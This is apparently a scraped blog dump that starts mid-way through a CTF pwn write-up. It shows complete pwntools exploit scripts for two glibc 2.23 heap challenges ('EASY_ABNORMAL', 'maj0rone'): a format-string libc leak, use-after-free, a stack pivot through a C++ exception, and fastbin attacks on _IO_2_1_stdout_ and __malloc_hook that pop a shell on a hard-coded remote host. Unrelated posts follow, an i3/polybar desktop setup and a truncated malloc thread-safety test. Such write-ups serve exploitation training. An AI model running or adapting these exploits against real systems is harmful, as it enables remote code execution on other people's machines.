libc.sym[&#x27;_IO_2_1_stderr_&#x27;] - 192\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\trm(1)\tp = b&#x27;A&#x27; * 0x80\tp += p64(0) + p64(0x71)\tp += p64(libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0x23)\tmd(0, p)\tad(0x68, &#x27;A&#x27;) # 1\t\tad(0x68, &#x27;A&#x27;) # 5\tog = libc_base + 0x4527a\t#og = libc_base + 0x3f42a\trealloc = libc_base + libc.sym[&#x27;realloc&#x27;]\tp = b&#x27;A&#x27; * (0x13 - 8)\tp += p64(og)\tp += p64(realloc + 4)\tmd(5, p)\tsl(&#x27;1&#x27;)\tsl(&#x27;10&#x27;)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tfor _ in range(16):\t\ttry:\t\t\tif LOCAL:\t\t\t\telf = ELF(elf_path)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\t\t\telse:\t\t\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\t\t\t\t\telse:\t\t\t\telf = ELF(elf_path)\t\t\t\tio = remote(server_ip, server_port)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\texploit()\t\t\tfinish()\t\texcept:\t\t\tcontinue\n\n\n\npwn3 [EASY_ABNORMAL]简要概述这个题直接就是湘湖杯的原题，添加了个prctl函数，我还以为是沙箱，还得我一直构造rop，一直在构造orw，’.&#x2F;flag’字符串的传入一直困扰我，后面先试试one_gadget是否打通，想不到还真通了。。。\n如何获取libc版本，和之前一样， 该提有个uaf漏洞，直接构造double free，泄漏__libc_start_main从而获得libc版本。\n思路字符串漏洞泄漏libc，在堆中构造one_gadget的rop，一下出现堆栈溢出，能够修改rbp寄存器的值，若覆盖改值，在c++抛出异常后就可实现堆栈迁移至堆中。\nunsigned __int64 gift()&#123;  _QWORD *v0; // rax  char buf; // [rsp+10h] [rbp-20h]  unsigned __int64 v3; // [rsp+28h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;INPUT:&quot;);  prctl(22, 2LL, &amp;unk_202070);  if ( (signed int)read(0, &amp;buf, 0x28uLL) &gt; 16 )  &#123;    v0 = (_QWORD *)_cxa_allocate_exception(8LL, &amp;buf);    *v0 = &quot;YOU ARE TOO YOUNG!&quot;;    _cxa_throw(v0, &amp;`typeinfo for&#x27;char const*, 0LL);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.arch=&#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;libc_path = &#x27;./libc.so.6&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;123.56.52.128&quot;server_port = 10012# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def sn():\tsla(&#x27;:&#x27;, &#x27;1&#x27;)def ad(d):\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, d)def rm(i):\tsla(&#x27;:&#x27;, &#x27;3&#x27;)\tsla(&#x27;:&#x27;, str(i))def dp():\tsla(&#x27;:&#x27;, &#x27;4&#x27;)def gift(d):\tsla(&#x27;:&#x27;, &#x27;23333&#x27;)\tsa(&#x27;:&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tp = &#x27;%11$p&#x27;\tsa(&#x27;:&#x27;, p)\tsn()\tru(&#x27;0x&#x27;)\tleak = int(r(12), 16)\t#(__libc_start_main+240)\tlibc_base = leak - libc.sym[&#x27;__libc_start_main&#x27;] - 240\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tog = libc_base + 0x4527a \tlibc.address= libc_base\tif(LOCAL):\t\tpop_rdi = libc_base + 0x20e22\t\tpop_rsi = libc_base + 0x20218\t\tpop_rdx = libc_base + 0x01b92\t\tpop6 = libc_base + 0x11633f\telse:\t\tpop_rdi = libc_base + 0x21112\t\tpop_rsi = libc_base + 0x202f8\t\tpop_rdx = libc_base + 0x01b92\tp = p64(0) * 3\trop = flat([\tog\t])\tp += rop\tad(p)\tad(&#x27;./flag\\x00&#x27;)\trm(0)\trm(1)\tdp()\tru(&#x27;idx 2:&#x27;)\tleak = u64(ru(&#x27;\\n&#x27;).ljust(8, b&#x27;\\x00&#x27;))\theap = leak\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;heap: &#x27; + hex(heap))\tp = b&#x27;A&#x27; * 0x20\tp += p64(heap + 0x20)\tp += b&#x27;A&#x27; * 0x9\tdb()\tgift(p)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\npwn4 [maj0rone]概述一个简单的堆体，没给libc，自己构造double free泄漏libc，libc版本还是与之前一样2.23的，该题添加了一点花指令，但不影响分析。\nvul在删除功能中存在指针没清零，造成uaf漏洞\n   sub_400846((unsigned int)dword_603010, (unsigned int)(dword_60303C + 1), v1);  &#125;&#125;else&#123;  sub_400846((unsigned int)dword_603010, (unsigned int)(dword_60303C + 1), (unsigned int)dword_603040);&#125;free(p_addr[v7]);                           // vullllll-----------if ( dword_60303C / dword_603010 &gt; 1 )&#123;  if ( dword_60303C % dword_603010 )  &#123;    if ( dword_60303C % dword_603010 != dword_60303C / dword_603010 || dword_603040 )\n\n思路程序没有开启pie，但got没法修改，没毛用，也没打印函数，需要fastbin attack打入_IO_2_1_stdout_泄漏libc，再次fastbin attack打入__malloc_hook - 0x23处打one_gadget，修改__realloc_hook为one_gadget，修改__malloc_hook为realloc，调整realloc偏移来调整execve第二个参数。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li  = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.23&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\tos.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;123.56.52.128&quot;server_port = 18523# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db ():\tif(LOCAL):\t\tgdb.attach(io)def ad(sz, d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;\\n&#x27;, &#x27;80&#x27;)\tsla(&#x27;?&#x27;, str(sz))\tsla(&#x27;?&#x27;, str(d))def rm(i):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)\tsla(&#x27;?&#x27;, str(i))def md(i, d):\tsla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)\tsla(&#x27;?&#x27;, str(i))\tsa(&#x27;?&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad(0xd0, &#x27;A&#x27;) # 0\tad(0x68, &#x27;A&#x27;) # 1\t\trm(0)\tad(0x68, &#x27;A&#x27;) # 2\trm(1)\trm(2)\tmd(2, &#x27;\\x70&#x27;)\tad(0x30, &#x27;A&#x27;) # 3\tmd(3, &#x27;\\xdd\\x55&#x27;)\t# for alignment\tad(0x68, &#x27;A&#x27;) # 4\tp = b&#x27;A&#x27; * 0x60\tp += p64(0) + p64(0x71)\tmd(0, p)\tad(0x68, &#x27;A&#x27;) # 5\tad(0x68, &#x27;B&#x27;) # 6\tp = b&#x27;\\x00&#x27; * 0x33 + p64(0xfbad3c80) + 3 * p64(0) + p8(0)\tmd(6, p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;_IO_2_1_stderr_&#x27;] - 192\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\trm(5)\tmd(5, p64(libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0x23))\tad(0x68, &#x27;A&#x27;) # 7\tad(0x68, &#x27;A&#x27;) # 8\tog = libc_base + 0x4527a\t#og = libc_base + 0x3f42a\trealloc = libc_base + libc.sym[&#x27;realloc&#x27;]\tp = b&#x27;A&#x27; * (0x13 - 8)\tp += p64(og)\tp += p64(realloc + 4)\tmd(8, p)\t#db()\t# get shell\tsla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;\\n&#x27;, &#x27;80&#x27;)\tsla(&#x27;?&#x27;, str(10))def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tfor _ in range(16):\t\ttry:\t\t\tif LOCAL:\t\t\t\telf = ELF(elf_path)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\t\t\telse:\t\t\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\t\t\t\t\telse:\t\t\t\telf = ELF(elf_path)\t\t\t\tio = remote(server_ip, server_port)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\texploit()\t\t\tfinish()\t\texcept:\t\t\tcontinue","categories":["ctf"],"tags":["pwn"]},{"title":"i3-desktop","url":"/2020/11/12/env/linux/i3_desktop/","content":"i3 桌面Installsudo pacman -S i3 # i3桌面sudo pacman -S feh # 设置背景sudo pacman -S picom # 设置为透明sudo pacman -S albert # albert, mod+d打开部分软件sudo pacman -S xfce4-volumed # fn组合键调节声音sudo pacman -S xfce4-power-manager # fn组合键调节屏幕亮度sudo pacman -S touchpad-indicator #触摸板sudo pacman -S rofi # 快捷程序启动sudo pacman -S scrot # 命令行截屏sudo pacman -S ranger # 控制台文件管理器\n\n打开配置文件: vim ~&#x2F;.config&#x2F;i3&#x2F;config\n添加\n# set auto runexec_always albertexec_always picom# 每次启动桌面会启动#exec xfce4-volumedexec xfce4-power-managerexec fcitx# 设置自己的快捷键bandsym $mod+g exec google-chrome-stable\n\n\n\n日常使用快捷键一下是我配置的快捷键\ni3默认的mod键为alt\nalt+r  :   打开终端\nalt+.   : 打开程序搜索\nalt+e  : 命令行打开文件管理器\nalt+f4 : 退出窗口：\nalt+shift+r : 重新载入i3\nalt+shift+e: 关闭i3\nalt+方向&#x2F;jkl: 在两个窗口中移动\nalt+num: 打开工作区\nalt+shift+num: 将当前窗口移动到某工作区\n如何实现分屏先按$mod+a焦距于父窗口，在通过$mod+h或者$mod+v控制接下来新的窗口以什么方式进行创建。\n去除i3标题栏new_window nonenew_float normalhide_edge_borders both\n\n\n\n设置随机壁纸exec_always --no-startup-id feh --randomize --bg-fill ~/Pictures \n\n设置静态壁纸\nexec_always --no-startup-id feh --bg-scale ~/Pictures/bg_16.jpg\n\n\n\npolybar配置添加polybar的启动脚本.\n内容如下：\n#!/bin/bash# Terminate already running bar instanceskillall -q polybar# Wait until the processes have been shut downwhile pgrep -u $UID -x polybar &gt;/dev/null; do sleep 1; done# Launch Polybar, using default config location ~/.config/polybar/configpolybar mybar\n\n添加完成后，执行\n$ sudo chmod +x ~&#x2F;.config&#x2F;polybar&#x2F;start添加可执行权限\npolybar配置文件我几乎没修改，只是修改了下透明背景色和网卡，让其显示网速，并禁用了一些没用的组件，polybar配置文件中 ; 为注释符号。汉字注释内容为修改添加的部分。\n;==========================================================;;;   ██████╗  ██████╗ ██╗  ██╗   ██╗██████╗  █████╗ ██████╗;   ██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗;   ██████╔╝██║   ██║██║   ╚████╔╝ ██████╔╝███████║██████╔╝;   ██╔═══╝ ██║   ██║██║    ╚██╔╝  ██╔══██╗██╔══██║██╔══██╗;   ██║     ╚██████╔╝███████╗██║   ██████╔╝██║  ██║██║  ██║;   ╚═╝      ╚═════╝ ╚══════╝╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝;;;   To learn more about how to configure Polybar;   go to https://github.com/polybar/polybar;;   The README contains a lot of information;;==========================================================[colors];background = $&#123;xrdb:color0:#222&#125;;background = #222 ;设置背景色为半透明background= #b0222222 background-alt = #444;foreground = $&#123;xrdb:color7:#222&#125;foreground = #dfdfdfforeground-alt = #555primary = #ffb52asecondary = #e60053alert = #bd2c40[bar/mybar];monitor = $&#123;env:MONITOR:HDMI-1&#125;width = 100%height = 27;offset-x = 1%;offset-y = 1%radius = 6.0fixed-center = falsebackground = $&#123;colors.background&#125;foreground = $&#123;colors.foreground&#125;line-size = 3line-color = #f00border-size = 4border-color = #00000000padding-left = 0padding-right = 2module-margin-left = 1module-margin-right = 2font-0 = fixed:pixelsize=10;1font-1 = unifont:fontformat=truetype:size=8:antialias=false;0font-2 = siji:pixelsize=10;1modules-left = bspwm i3;mpd音乐播放器插件，懒得配置，直接禁用;modules-center = mpd;组件排列顺序，eth为有线网卡,下面为默认设置，把自己用不到的删除，台式机没有wlan所以直接删除了;modules-right = filesystem xbacklight alsa pulseaudio xkeyboard memory cpu wlan eth battery temperature date powermenumodules-right =   alsa   eth  memory cpu  date  tray-position = righttray-padding = 2;tray-background = #0063ff;wm-restack = bspwm;wm-restack = i3;override-redirect = true;scroll-up = bspwm-desknext;scroll-down = bspwm-deskprev;scroll-up = i3wm-wsnext;scroll-down = i3wm-wsprevcursor-click = pointercursor-scroll = ns-resize[module/xwindow]type = internal/xwindowlabel = %title:0:30:...%[module/xkeyboard]type = internal/xkeyboardblacklist-0 = num lockformat-prefix = &quot; &quot;format-prefix-foreground = $&#123;colors.foreground-alt&#125;format-prefix-underline = $&#123;colors.secondary&#125;label-layout = %layout%label-layout-underline = $&#123;colors.secondary&#125;label-indicator-padding = 2label-indicator-margin = 1label-indicator-background = $&#123;colors.secondary&#125;label-indicator-underline = $&#123;colors.secondary&#125;[module/filesystem]type = internal/fsinterval = 25mount-0 = /label-mounted = %&#123;F#0a81f5&#125;%mountpoint%%&#123;F-&#125;: %percentage_used%%label-unmounted = %mountpoint% not mountedlabel-unmounted-foreground = $&#123;colors.foreground-alt&#125;[module/bspwm]type = internal/bspwmlabel-focused = %index%label-focused-background = $&#123;colors.background-alt&#125;label-focused-underline= $&#123;colors.primary&#125;label-focused-padding = 2label-occupied = %index%label-occupied-padding = 2label-urgent = %index%!label-urgent-background = $&#123;colors.alert&#125;label-urgent-padding = 2label-empty = %index%label-empty-foreground = $&#123;colors.foreground-alt&#125;label-empty-padding = 2; Separator in between workspaces; label-separator = |[module/i3]type = internal/i3format = &lt;label-state&gt; &lt;label-mode&gt;index-sort = truewrapping-scroll = false; Only show workspaces on the same output as the bar;pin-workspaces = truelabel-mode-padding = 2label-mode-foreground = #000label-mode-background = $&#123;colors.primary&#125;; focused = Active workspace on focused monitorlabel-focused = %index%label-focused-background = $&#123;colors.background-alt&#125;label-focused-underline= $&#123;colors.secondary&#125;label-focused-padding = 2; unfocused = Inactive workspace on any monitorlabel-unfocused = %index%label-unfocused-padding = 2; visible = Active workspace on unfocused monitorlabel-visible = %index%label-visible-background = $&#123;self.label-focused-background&#125;label-visible-underline = $&#123;self.label-focused-underline&#125;label-visible-padding = $&#123;self.label-focused-padding&#125;; urgent = Workspace with urgency hint setlabel-urgent = %index%label-urgent-background = $&#123;colors.alert&#125;label-urgent-padding = 2; Separator in between workspaces; label-separator = |[module/mpd]type = internal/mpdformat-online = &lt;label-song&gt;  &lt;icon-prev&gt; &lt;icon-stop&gt; &lt;toggle&gt; &lt;icon-next&gt;icon-prev = icon-stop = icon-play = icon-pause = icon-next = label-song-maxlen = 25label-song-ellipsis = true[module/xbacklight]type = internal/xbacklightformat = &lt;label&gt; &lt;bar&gt;label = BLbar-width = 10bar-indicator = |bar-indicator-foreground = #fffbar-indicator-font = 2bar-fill = ─bar-fill-font = 2bar-fill-foreground = #9f78e1bar-empty = ─bar-empty-font = 2bar-empty-foreground = $&#123;colors.foreground-alt&#125;[module/backlight-acpi]inherit = module/xbacklighttype = internal/backlightcard = intel_backlight[module/cpu]type = internal/cpuinterval = 1format-prefix = &quot; &quot;format-prefix-foreground = $&#123;colors.foreground-alt&#125;format-underline = #f90000label =CPU %percentage:2%%[module/memory]type = internal/memoryinterval = 1format-prefix = &quot; &quot;format-prefix-foreground = $&#123;colors.foreground-alt&#125;format-underline = #4bffdclabel =RAM %percentage_used%%;无线网卡设备[module/wlan]type = internal/network;请将interface设为自己的网卡名称interface = net1interval = 3.0format-connected = &lt;ramp-signal&gt; &lt;label-connected&gt;format-connected-underline = #9f78e1label-connected = %essid%format-disconnected =;format-disconnected = &lt;label-disconnected&gt;;format-disconnected-underline = $&#123;self.format-connected-underline&#125;;label-disconnected = %ifname% disconnected;label-disconnected-foreground = $&#123;colors.foreground-alt&#125;ramp-signal-0 = ramp-signal-1 = ramp-signal-2 = ramp-signal-3 = ramp-signal-4 = ramp-signal-foreground = $&#123;colors.foreground-alt&#125;;有线网卡[module/eth]type = internal/network;请将interface设为自己的网卡名称;interface = enp34s0interval = 2.0format-connected-underline = #55aa55format-connected-prefix = &quot; &quot;format-connected-prefix-foreground = $&#123;colors.foreground-alt&#125;;label-connected = %local_ip%; Seconds to sleep between updates; Default: 1;interval = 3.0; Test connectivity every Nth update; A value of 0 disables the feature; NOTE: Experimental (needs more testing); Default: 0;ping-interval = 3; @deprecated: Define min width using token specifiers (%downspeed:min% and %upspeed:min%); Minimum output width of upload/download rate; Default: 3udspeed-minwidth = 5; Accumulate values from all interfaces; when querying for up/downspeed rate; Default: falseaccumulate-stats = true; Consider an `UNKNOWN` interface state as up.; Some devices like USB network adapters have ; an unknown state, even when they&#x27;re running; Default: falseunknown-as-up = true; Available tags:;   &lt;label-connected&gt; (default);   &lt;ramp-signal&gt;format-connected =  &lt;label-connected&gt;; Available tags:;   &lt;label-disconnected&gt; (default)format-disconnected = &lt;label-disconnected&gt;; Available tags:;   &lt;label-connected&gt; (default);   &lt;label-packetloss&gt;;   &lt;animation-packetloss&gt;format-packetloss = &lt;animation-packetloss&gt; &lt;label-connected&gt;; All labels support the following tokens:;   %ifname%    [wireless+wired];   %local_ip%  [wireless+wired];   %local_ip6% [wireless+wired];   %essid%     [wireless];   %signal%    [wireless];   %upspeed%   [wireless+wired];   %downspeed% [wireless+wired];   %linkspeed% [wired]; Default: %ifname% %local_ip%label-connected =  %downspeed:9%label-connected-foreground = #eefafafa; Default: (none)label-disconnected = not connectedlabel-disconnected-foreground = #66ffffff; Default: (none);label-packetloss = %essid%;label-packetloss-foreground = #eefafafa; Only applies if &lt;ramp-signal&gt; is usedramp-signal-0 = 😱ramp-signal-1 = 😠ramp-signal-2 = 😒ramp-signal-3 = 😊ramp-signal-4 = 😃ramp-signal-5 = 😈; Only applies if &lt;animation-packetloss&gt; is usedanimation-packetloss-0 = ⚠animation-packetloss-0-foreground = #ffa64canimation-packetloss-1 = 📶animation-packetloss-1-foreground = #000000; Framerate in millisecondsanimation-packetloss-framerate = 500;format-disconnected =;format-disconnected = &lt;label-disconnected&gt;;format-disconnected-underline = $&#123;self.format-connected-underline&#125;;label-disconnected = %ifname% disconnected;label-disconnected-foreground = $&#123;colors.foreground-alt&#125;[module/date]type = internal/dateinterval = 5date =date-alt = &quot; %Y-%m-%d&quot;time = %H:%Mtime-alt = %H:%M:%Sformat-prefix = format-prefix-foreground = $&#123;colors.foreground-alt&#125;format-underline = #0a6cf5label = %date% %time%[module/pulseaudio]type = internal/pulseaudioformat-volume = &lt;label-volume&gt; &lt;bar-volume&gt;label-volume = VOL %percentage%%label-volume-foreground = $&#123;root.foreground&#125;label-muted = 🔇 mutedlabel-muted-foreground = #666bar-volume-width = 10bar-volume-foreground-0 = #55aa55bar-volume-foreground-1 = #55aa55bar-volume-foreground-2 = #55aa55bar-volume-foreground-3 = #55aa55bar-volume-foreground-4 = #55aa55bar-volume-foreground-5 = #f5a70abar-volume-foreground-6 = #ff5555bar-volume-gradient = falsebar-volume-indicator = |bar-volume-indicator-font = 2bar-volume-fill = ─bar-volume-fill-font = 2bar-volume-empty = ─bar-volume-empty-font = 2bar-volume-empty-foreground = $&#123;colors.foreground-alt&#125;[module/alsa]type = internal/alsaformat-volume = &lt;label-volume&gt; &lt;bar-volume&gt;label-volume = VOLlabel-volume-foreground = $&#123;root.foreground&#125;format-muted-prefix = &quot; &quot;format-muted-foreground = $&#123;colors.foreground-alt&#125;label-muted = sound mutedbar-volume-width = 10bar-volume-foreground-0 = #55aa55bar-volume-foreground-1 = #55aa55bar-volume-foreground-2 = #55aa55bar-volume-foreground-3 = #55aa55bar-volume-foreground-4 = #55aa55bar-volume-foreground-5 = #f5a70abar-volume-foreground-6 = #ff5555bar-volume-gradient = falsebar-volume-indicator = |bar-volume-indicator-font = 2bar-volume-fill = ─bar-volume-fill-font = 2bar-volume-empty = ─bar-volume-empty-font = 2bar-volume-empty-foreground = $&#123;colors.foreground-alt&#125;[module/battery]type = internal/batterybattery = BAT0adapter = ADP1full-at = 98format-charging = &lt;animation-charging&gt; &lt;label-charging&gt;format-charging-underline = #ffb52aformat-discharging = &lt;animation-discharging&gt; &lt;label-discharging&gt;format-discharging-underline = $&#123;self.format-charging-underline&#125;format-full-prefix = &quot; &quot;format-full-prefix-foreground = $&#123;colors.foreground-alt&#125;format-full-underline = $&#123;self.format-charging-underline&#125;ramp-capacity-0 = ramp-capacity-1 = ramp-capacity-2 = ramp-capacity-foreground = $&#123;colors.foreground-alt&#125;animation-charging-0 = animation-charging-1 = animation-charging-2 = animation-charging-foreground = $&#123;colors.foreground-alt&#125;animation-charging-framerate = 750animation-discharging-0 = animation-discharging-1 = animation-discharging-2 = animation-discharging-foreground = $&#123;colors.foreground-alt&#125;animation-discharging-framerate = 750[module/temperature]type = internal/temperaturethermal-zone = 0warn-temperature = 60format = &lt;ramp&gt; &lt;label&gt;format-underline = #f50a4dformat-warn = &lt;ramp&gt; &lt;label-warn&gt;format-warn-underline = $&#123;self.format-underline&#125;label = %temperature-c%label-warn = %temperature-c%label-warn-foreground = $&#123;colors.secondary&#125;ramp-0 = ramp-1 = ramp-2 = ramp-foreground = $&#123;colors.foreground-alt&#125;[module/powermenu]type = custom/menuexpand-right = trueformat-spacing = 1label-open =Powerlabel-open-foreground = $&#123;colors.secondary&#125;label-close = cancellabel-close-foreground = $&#123;colors.secondary&#125;label-separator = |label-separator-foreground = $&#123;colors.foreground-alt&#125;menu-0-0 = rebootmenu-0-0-exec = menu-open-1menu-0-1 = power offmenu-0-1-exec = menu-open-2menu-1-0 = cancelmenu-1-0-exec = menu-open-0menu-1-1 = rebootmenu-1-1-exec = sudo rebootmenu-2-0 = power offmenu-2-0-exec = sudo poweroffmenu-2-1 = cancelmenu-2-1-exec = menu-open-0[settings]screenchange-reload = true;compositing-background = xor;compositing-background = screen;compositing-foreground = source;compositing-border = over;pseudo-transparency = false[global/wm]margin-top = 5margin-bottom = 5; vim:ft=dosini\n\n在 ~&#x2F;.coinfig&#x2F;i3&#x2F;config中添加\n\n\n\n\nranger控制台文件管理器\nbindsym $mod+e exec terminator -x ranger\n\n\n\nterminator去掉标题，去掉scroll\nbindsym $mod+r exec terminator\n\n\n\n设置快捷键截屏bindsym $mod+d exec --no-startup-id deepin-screenshot \n\n\n\n设置i3-gap#********************************************i3-gaps*********************************for_window [class=&quot;^.*&quot;] border pixel 0gaps inner 8gaps outer 6set $mode_gaps Gaps: (o) outer, (i) innerset $mode_gaps_outer Outer Gaps: +|-|0 (local), Shift + +|-|0 (global)set $mode_gaps_inner Inner Gaps: +|-|0 (local), Shift + +|-|0 (global)bindsym $mod+Shift+g mode &quot;$mode_gaps&quot;mode &quot;$mode_gaps&quot; &#123;        bindsym o      mode &quot;$mode_gaps_outer&quot;        bindsym i      mode &quot;$mode_gaps_inner&quot;        bindsym Return mode &quot;default&quot;        bindsym Escape mode &quot;default&quot;&#125;mode &quot;$mode_gaps_inner&quot; &#123;        bindsym plus  gaps inner current plus 5        bindsym minus gaps inner current minus 5        bindsym 0     gaps inner current set 0        bindsym Shift+plus  gaps inner all plus 5        bindsym Shift+minus gaps inner all minus 5        bindsym Shift+0     gaps inner all set 0        bindsym Return mode &quot;default&quot;        bindsym Escape mode &quot;default&quot;&#125;mode &quot;$mode_gaps_outer&quot; &#123;        bindsym plus  gaps outer current plus 5        bindsym minus gaps outer current minus 5        bindsym 0     gaps outer current set 0        bindsym Shift+plus  gaps outer all plus 5        bindsym Shift+minus gaps outer all minus 5        bindsym Shift+0     gaps outer all set 0        bindsym Return mode &quot;default&quot;        bindsym Escape mode &quot;default&quot;&#125;\n\n\n\n电源管理#*********************************************电源管理*************************************set $mode_system  lock(L) logout(O) reboot(R) shutdown(S) exit(Esc)bindsym $mod+c mode &quot;$mode_system&quot;mode &quot;$mode_system&quot; &#123;    bindsym l exec --no-startup-id i3lock -c &#x27;#000000&#x27;, mode &quot;default&quot;    bindsym o exec --no-startup-id i3-msg exit, mode &quot;default&quot;    bindsym r exec --no-startup-id systemctl reboot, mode &quot;default&quot;    bindsym s exec --no-startup-id systemctl poweroff, mode &quot;default&quot;    bindsym Escape mode &quot;default&quot;&#125;\n\n\n\n配置i3-bar这里我直接把它隐藏掉了\nbar &#123;        status_command i3status\t\tposition top\t\tmode hide    colors &#123;        #background 0000ff        statusline ffffff        separator 666666        #focused_workspace  4c7899 285577 ffffff        #active_workspace   333333 5f676a ffffff        #inactive_workspace 333333 222222 888888        #urgent_workspace   2f343a 900000 ffffff        #binding_mode       2f343a 900000 ffffff    &#125;&#125;\n\n","categories":["env"],"tags":["linux"]},{"title":"thread-security","url":"/2020/11/12/security/thread-security/","content":"Thread Security验证在我写lgx 服务器的时候，发现日志功能在多线程同时写入日志的时候就会发生崩溃，后面采用自己实现的线程信号量来避免该问题，但是后面在我修改http缓冲区从std::string修改为lgx::util::vessel时，我就在考虑std::string是否会存在多线程安全问题，由于涉及到内存开辟与释放，那么接下来我将会证明一下是否会存在该问题，现在我先证明一下现在的malloc, free, realloc是否会存在多线程安全问题，因为在c++中new与delete关键字只是对malloc与free函数进行了一个改编而已。\n测试环境:\narchlinux\nglibc 2.32\ngcc: 10.2.0\n#include&lt;pthread.h&gt;#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;void *func(void *args) &#123;\tprintf(&quot;start thread.%lx\\n&quot;, pthread_self());\tfor (int i = 0; i &lt; 0x1000; ++i) &#123;\t\tchar *bp = malloc(i * 0x10 + 0x100);\t\tbp = realloc(bp, i * 0x10 + 0x200);\t\tfree(bp);\t&#125;\treturn (void*)0;&#125;int main() &#123;\tpthread_t ta[100];\tfor(int i = 0; i &lt; 20; ++i) &#123;\t\tpthread_create(&amp;ta[i], NULL, func, NULL);\t&#125;\tfor(int i = 0; i &lt; 20; ++i) &#123;\t\tpthread_join(ta[i], NULL);\t&#125;\treturn 0;&#125;\n\n开启20个线程同时堆内存进行开辟与释放，看是否发现多线程安全问题。\n运行如下:\n┌[logan☮arch]-(~)└&gt; ./a.out   start thread.7f5d34cc0640start thread.7f5d344bf640start 